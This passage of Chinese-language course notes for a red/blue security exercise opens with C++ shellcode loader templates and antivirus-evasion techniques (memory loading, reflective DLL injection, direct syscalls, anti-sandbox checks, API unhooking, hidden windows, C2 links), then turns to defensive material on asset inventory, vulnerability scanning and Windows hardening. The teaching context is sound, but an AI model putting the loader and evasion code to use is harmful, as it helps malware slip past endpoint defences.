<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">	HANDLE myHeap = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">void</span>* exec = <span class="built_in">HeapAlloc</span>(myHeap, HEAP_ZERO_MEMORY, <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode));</span><br><span class="line">	<span class="built_in">memcpy</span>(exec,shellcode,<span class="built_in"><span class="keyword">sizeof</span></span>(shellcode));</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>data段</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())(<span class="keyword">void</span>*)shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建线程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode⻓度</span></span><br><span class="line">	DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">	HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">	<span class="comment">/* length: 800 bytes */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(buf), MEM_COMMIT,</span><br><span class="line">	PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">CopyMemory</span>(shellcode,buf,<span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">	hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">	(LPTHREAD_START_ROUTINE)shellcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread,INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回调函数，⽐如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	LPVOID address = ::<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode), MEM_RESERVE |</span><br><span class="line">	MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(address, &amp;shellcode[<span class="number">0</span>], <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode));</span><br><span class="line">	HDC dc = <span class="built_in">GetDC</span>(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">EnumFontsW</span>(dc, <span class="literal">NULL</span>, (FONTENUMPROCW)address, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>Shellcode免杀—内存加载免杀</strong></p>
<p>用实现同样功能的api替换<br>试想我们开辟一块内存,然后直接将shellcode写入到对应的内存中并且该内存是可读可写可执行的状态,那么这种方式太容易被AV所查杀,因此当我们如果是利用Windows自身提供的API来将加密或者封装好的shellcode写入到内存执行的话,将会<br>大大增加查杀的难度。<br>•通过UUID方式实现内存加载<br>•利用MAC实现内存加载<br>•利用Ipv4方式实现内存加载<br>•利用Ipv6方式实现内存加载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/Shellcode_Memory_Loader">https://github.com/crisprss/Shellcode_Memory_Loader</a><br>•基于Golang实现的Shellcode内存加载器,共实现3中内存加载shellcode方式,<br>•UUID加载,MAC加载和IPv4加载<br>•结合binject/universal实现Golang的内存加载DLL方式,<br>•使用AllocADsMem实现内存申请,以加强免杀效果<br>•简单的反沙箱机制,</p>
<hr>
<p><strong>Shellcode免杀—反射DLL注入</strong></p>
<p>常见方法：<br>•创建新线程<br>•插入Apc队列<br>•手动实现LoadLibrary<br>•修改注册表<br>•挂钩窗口消息<br>•设置线程上下背景文，修改寄存器</p>
<hr>
<p><strong>后渗透常见行为免杀—PE文件加载器</strong></p>
<p>PE加载器<br>PE加载器，就是将一个PE文件映射到自己的内存，然后启动其main函数运行程序。一个PELoader的实现，需要有几个注意点：内存对齐，修复IAT表，修复重定位表，将内存属性改为可执行。<br>•内存对齐，根据exe文件在加载到内存中对齐粒度进行对齐<br>•修复IAT表，根据PE结构的导入表，加载所需的dll，并获取导入函数的地址并写入导入表中<br>•修复重定位表，直接申请当前exe的ImageBase地址，如果加载到内存当中的基址与Option Header的Image Base一样，就相当于在理想基址中展开，不需要修复重定位表。但是这种方法一般用于x64的程序，因为x86程序的Image Base较低，被占用导致无法正常执行的几率很高。<br>•程序加密，使用了RC4加密算法，将要加载的PE文件加密并存放在资源段中，这种方法其实免杀效果并不好，接下来可以考虑其他将Loader和payload分离的其他方法。</p>
<p>执行流程<br>加载PE文件：判断是否为PE文件，然后将要加载的文件读取到内存中，并且对齐。进行重定位：如果当前加载到内存当中的基址与Option Header的Image Base一样，即在理想基址中展开了，或重定位表data[5]的长度为0，则不需要重定位。重定位表的sizeOfBlock是加上块头部8字节的大小。重定位元素也很简单，以WORD为单位，但要注意高4位为0x3才有效，修复重定位表时要检查该位是否有效。<br>构建导入表：通过偏移+内存基址，获取导入表第一个dll的数据，按照导入的dll逐个遍历，直到当前导入表的OriginalFirstThunk为0，即遍历完毕。</p>
<hr>
<p><strong>Shellcode免杀—系统直接调用</strong></p>
<p>Windows操作系统中实际只使用了两个特权级别：<br>一个是Ring3层，平时我们所见到的应用程序运行在这一层，所以叫它用户层，也叫User-Mode。所以下次听到别人讲（Ring3、用户层、User-Mode）时，其实是在讲同一个概念。一个是Ring0层，像操作系统内核（Kernel）这样重要的系统组件，以及设备驱动都是运行在Ring0，内核层，也叫Kernel-Mode。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716221353625.png" alt="image-20220716221353625"></p>
<p>通过这些保护层来隔离普通的用户程序，不能直接访问内存区域，以及运行在内核模式下的系统资源。当一个用户层程序需要执行一个特权系统操作，或者访问内核资源时。处理器首先需要切换到Ring0模式下才能执行后面的操作。切换Ring0的代码，也就是直接系统调用所在的地方。我们通过监控Notepad.exe进程保存一个.txt文件，来演示一个应用层程序如<br>何切换到内核模式执行的：</p>
<p>地狱之门是一个动态调用syscall的工具，在绕过杀软、EDR等防护软件上有不错的效果，其原理可以查看：<br><a target="_blank" rel="noopener" href="https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf">https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf</a></p>
<hr>
<p><strong>后渗透常见行为免杀—白+黑</strong></p>
<p>•LoLBin是操作系统提供的二进制文件，通常用于合法目的，但也有可能被恶意行为者滥用。有一些默认存在的系统二进制文件可能会存在一些“副作用”，从而导致攻击者利用这些系统文件来隐藏他们的恶意活动。<br>•LoLBins并不是一个新鲜的概念，也不仅仅针对Windows环境。从早期的DOS操作系统和Unix系统开始，几乎所有流行的操作系统中都包含着攻击者可以利用的可执行文件。</p>
<p>白加黑 算是一个很好的方法，指的是利用Windows系统的一些白文件去执行相应的敏感操作，就不会触发杀软警告，想一想，有哪个普通的程序去执行添加用户的操作呢？说到底，白加黑解决的是 Windows里面 信任与权限的问题，Windows 都相信你，它一个杀软有什么办法，权限指的是你的权限是否比杀软的权限高，如果你在0环，杀软在3环，它也没有权限来管你，更不用说kill。</p>
<hr>
<p><strong>Shellcode免杀—anti sandbox(云沙箱对抗)</strong></p>
<p>那么问题来了，如何对抗云沙箱的检测呢？我们知道，很多杀软都有自己的后端云沙箱，这些沙箱能够模拟出软件执行所需的运行环境，通过进程hook技术来对软件执行过程中的行为进行分析，判断其是否有敏感的操作行为，或者更高级的检测手法是，将获取到的程序的API调用序列以及其他的一些行为特征输入到智能分析引擎中（基于机器学习org）进行检测。所以，如果我们的木马没有做好反调试，很容易就被沙箱检测出来。最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是explore。如果一个程序的父进程不是explore，那么我们就可以认为他是由沙箱启动的。那么我们就直接exit退出，这样，杀软就无法继续对我们进行行为分析了。</p>
<p>当今大多数真实机具有4GB以上的RAM,我们可以检测RAM是否大于4GB来判断是否是真实的运行机器,同样大多数真实机拥有4核心cpu，许多在线检测的虚拟机沙箱是2核，我们可以通过核心数来判断是否为真实机器或检测用的虚拟沙箱，当然反沙箱还有更多高端操作以及其他判断源，例如可以从系统开机时间、临时文件夹的文件数目</p>
<hr>
<p><strong>后渗透常见行为免杀—api unhooking</strong></p>
<p>杀软会hook关键函数,可以修改函数的头部来脱钩<br>另外 可以使用系统直接调用,绕过杀软对一些脱钩过程中使用的函数的hook<br>•<a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/">https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716221823970.png" alt="image-20220716221823970"></p>
<p>Hook<br>•<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions">https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/EDRs/">https://github.com/Mr-Un1k0d3r/EDRs/</a><br>•<a target="_blank" rel="noopener" href="https://gist.github.com/sbasu7241/4c2640fb6dd5bfdcfac07b83f1648ee0">https://gist.github.com/sbasu7241/4c2640fb6dd5bfdcfac07b83f1648ee0</a><br>Unhook<br>•<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-e">https://www.ired.team/offensive-security/defense-e</a>…<br>•AQUARMOURY/Shellycoat at master · slaeryan/AQUARMO…<br>•GitHub - mgeeky/unhook-bof: Remove API hooks from …</p>
<hr>
<p><strong>Shellcode免杀—隐藏窗口</strong></p>
<p>wmain 创建窗口项目<br>•命令参数</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">•<span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/subsystem:windows /entry:mainCRTStartup&quot;</span> )</span></span><br><span class="line">•powershell</span><br><span class="line">•Start-<span class="built_in">Process</span> <span class="string">&quot;C:`z\Windows\System32\cmd.exe&quot;</span> -Window Hidden</span><br><span class="line">•C#</span><br><span class="line">•var handle = <span class="built_in">GetConsoleWindow</span>();</span><br><span class="line">		<span class="built_in">ShowWindow</span>(handle, SW_HIDE);</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>Shellcode免杀—小众语言</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/V1V1/OffensiveAutoIt">https://github.com/V1V1/OffensiveAutoIt</a><br>•<a target="_blank" rel="noopener" href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a></p>
<hr>
<p><strong>Shellcode免杀—小众c2框架</strong></p>
<p>目前而言，cs 无论是马或者源文件都被分析烂了，且 cs 的行为太明显了，必须要大改特改才能满足现在的红蓝对抗，但是想大改谈何容易，所以最快的方法是寻找一款新的 c2 框架，说白了，远控自己都能写一个出来，执行一些简单操作还是可以的。<br>•github 地址<br>•<a target="_blank" rel="noopener" href="https://github.com/postrequest/link">https://github.com/postrequest/link</a></p>
<h1 id="安全运维"><a href="#安全运维" class="headerlink" title="安全运维"></a>安全运维</h1><h2 id="护-网-概-述"><a href="#护-网-概-述" class="headerlink" title="护 网 概 述"></a>护 网 概 述</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211458133.png" alt="image-20220720211458133"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211603924.png" alt="image-20220720211603924"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211640434.png" alt="image-20220720211640434"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211718311.png" alt="image-20220720211718311"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211738215.png" alt="image-20220720211738215"></p>
<p><strong>防守方技巧</strong></p>
<p>技巧<br>➢非所属资产必须上诉; ( 合作企业资产带有单位名称/logo ,不再负责运营管理的资产等)<br>➢被判别为敏感数据但非数据库泄露的扣分项选择性上诉;<br>➢被判别为内网资产的扣分项,要求提供证明是我方资产;<br>要点<br>➢态度严谨<br>➢无确凿证据,拒不承认</p>
<p><strong>防守方主动得分技巧</strong></p>
<p>技巧<br>➢关注文件沙箱的告警日志,分析业务系统/邮箱流量获取的恶意样本;<br>➢关注高危漏洞告警, 如注入、命令执行、反序列化,系统提取等漏洞;<br>要点<br>➢严格按照标准,提供充足证明</p>
<p><strong>实用技巧</strong></p>
<p>IP封禁是简单有效的防护方式;<br>内网资产监测与防护极为重要;<br>遇到国外地址进行攻击一律封禁,虽无法得分但具有真实防护效果;<br>沙箱设备能覆盖木马攻击和邮件攻击,建议设置专人专职进行样本分析;<br>提交报告需包含关键内容:源IP ,事件类型,流量分析(全流量) ,有样本需附上样本及分析报告,切忌只截设备告警图;<br>建立快速沟通渠道, 避免耽误上报时间;</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212244679.png" alt="image-20220720212244679"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212300633.png" alt="image-20220720212300633"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212416280.png" alt="image-20220720212416280"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212429524.png" alt="image-20220720212429524"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212443481.png" alt="image-20220720212443481"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212500317.png" alt="image-20220720212500317"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212513850.png" alt="image-20220720212513850"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212550171.png" alt="image-20220720212550171"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212607604.png" alt="image-20220720212607604"></p>
<h2 id="前-期-自-查-工-作"><a href="#前-期-自-查-工-作" class="headerlink" title="前 期 自 查 工 作"></a>前 期 自 查 工 作</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212624861.png" alt="image-20220720212624861"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212637310.png" alt="image-20220720212637310"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212652093.png" alt="image-20220720212652093"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212704967.png" alt="image-20220720212704967"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212723115.png" alt="image-20220720212723115"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212740402.png" alt="image-20220720212740402"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212759766.png" alt="image-20220720212759766"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212812736.png" alt="image-20220720212812736"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212829023.png" alt="image-20220720212829023"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212842376.png" alt="image-20220720212842376"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212856316.png" alt="image-20220720212856316"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212910137.png" alt="image-20220720212910137"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212922873.png" alt="image-20220720212922873"></p>
<h2 id="资-产-梳-理"><a href="#资-产-梳-理" class="headerlink" title="资 产 梳 理"></a>资 产 梳 理</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212936159.png" alt="image-20220720212936159"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213045148.png" alt="image-20220720213045148"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213103871.png" alt="image-20220720213103871"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213117733.png" alt="image-20220720213117733"></p>
<p><strong>基本收集方法</strong><br>1.基础资产表收集<br>2.扫描手段补充信息<br>3.监控手段补充信息<br>4.其它信息补充</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213150966.png" alt="image-20220720213150966"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213203225.png" alt="image-20220720213203225"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213219885.png" alt="image-20220720213219885"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213233146.png" alt="image-20220720213233146"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213247198.png" alt="image-20220720213247198"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213259188.png" alt="image-20220720213259188"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213310069.png" alt="image-20220720213310069"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213324469.png" alt="image-20220720213324469"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213338629.png" alt="image-20220720213338629"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213354017.png" alt="image-20220720213354017"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213405856.png" alt="image-20220720213405856"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213417386.png" alt="image-20220720213417386"></p>
<h2 id="漏-洞-扫-描"><a href="#漏-洞-扫-描" class="headerlink" title="漏 洞 扫 描"></a>漏 洞 扫 描</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213432717.png" alt="image-20220720213432717"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213445651.png" alt="image-20220720213445651"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213456544.png" alt="image-20220720213456544"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213508974.png" alt="image-20220720213508974"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213520210.png" alt="image-20220720213520210"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213532602.png" alt="image-20220720213532602"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213550344.png" alt="image-20220720213550344"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213618711.png" alt="image-20220720213618711"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213630219.png" alt="image-20220720213630219"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213646085.png" alt="image-20220720213646085"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213656781.png" alt="image-20220720213656781"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213708434.png" alt="image-20220720213708434"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213718442.png" alt="image-20220720213718442"></p>
<p><strong>漏扫结果评估</strong><br>1关键信息提权<br>2漏洞信息检索<br>3常见加固方案<br>4报告整理输出</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213758077.png" alt="image-20220720213758077"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213810096.png" alt="image-20220720213810096"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213847667.png" alt="image-20220720213847667"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213857324.png" alt="image-20220720213857324"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213906685.png" alt="image-20220720213906685"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213917457.png" alt="image-20220720213917457"></p>
<p><strong>漏洞扫描误报分析</strong><br>1.常见误报分析<br>2.常见误报场景<br>3.误报案例分析</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213939512.png" alt="image-20220720213939512"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213954218.png" alt="image-20220720213954218"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214207666.png" alt="image-20220720214207666"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214147195.png" alt="image-20220720214147195"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214120929.png" alt="image-20220720214120929"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214057031.png" alt="image-20220720214057031"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214259704.png" alt="image-20220720214259704"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214317607.png" alt="image-20220720214317607"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214331949.png" alt="image-20220720214331949"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214346660.png" alt="image-20220720214346660"></p>
<h1 id="系统及中间件加固"><a href="#系统及中间件加固" class="headerlink" title="系统及中间件加固"></a>系统及中间件加固</h1><h2 id="windows-主机加固"><a href="#windows-主机加固" class="headerlink" title="windows 主机加固"></a>windows 主机加固</h2><p><strong>账户管理和认证授权</strong></p>
<p>账户<br>默认账户安全<br>禁用Guest账户。<br>禁用或删除其他无用账户（建议先禁用账户三个月，待确认没有问题后删除。）</p>
<p>思考：<br>1、为什么要禁用Guest用户？</p>
<pre><code>Guest账户为临时账户，但是该账户允许用户登录到网络、浏览internet以及关闭计算机。黑客可以通过guest用户提权到administrator组得到管理员权限，进行后渗透。
</code></pre>
<p>2、为什么禁用或删除其他无用账户？</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">防止提权</span><br></pre></td></tr></table></figure>

<p>3、为什么建议先禁用账户三个月，待确认没有问题后删除？</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为直接删除，有些正常用户就无法使用了，为了避免影响业务所以先禁用三个月，在三个月之内需要使用的用户发现异常会联系你，也就知道哪些是正常用户哪些该用户该删除。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>实操</strong></p>
<p>•打开 计算机 &gt; 管理 &gt; 本地用户和组 &gt; 用户中，双击 Guest 帐户，在属性中选中 帐户已禁用，单击 确定。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225125458.png" alt="image-20220722225125458"></p>
<p>•按照用户分配帐户<br>•按照用户分配帐户。根据业务要求，设定不同的用户和用户组。例如，管理员用户，数据库用户，审计用户，来宾用户等。<br>•打开 计算机 &gt; 管理 &gt; 本地用户和组 &gt; 用户中，根据您的业务要求设定不同的用户和用户组，包括管理员用户、数据库用户、审计用户、来宾用户等。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225159840.png" alt="image-20220722225159840"></p>
<hr>
<p><strong>口令</strong><br>•cmd下secpol.msc<br>•密码复杂度<br>•密码复杂度要求必须满足以下策略：<br>•最短密码长度要求八个字符。<br>•启用本机组策略中密码必须符合复杂性要求的策略。<br>•即密码至少包含以下四种类别的字符中的两种：<br>•英语大写字母 A, B, C, … Z<br>•英语小写字母 a, b, c, … z<br>•西方阿拉伯数字 0, 1, 2, … 9<br>•非字母数字字符，如标点符号，@, #, $, %, &amp;, *等<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 密码策略 中，确认 密码必须符合复杂性要求 策略已启用。<br>•密码最长留存期<br>•对于采用静态口令认证技术的设备，帐户口令的留存期不应长于90天。<br>•操作步骤打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 密码策略 中，配置 密码最长使用期限 不大于90天。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225300240.png" alt="image-20220722225300240"></p>
<p>•帐户锁定策略<br>•对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过10次后，锁定该用户使用的帐户。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 帐户锁定策略 中，配置 帐户锁定阈值 不大于10次。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225339252.png" alt="image-20220722225339252"></p>
<hr>
<p><strong>授权</strong></p>
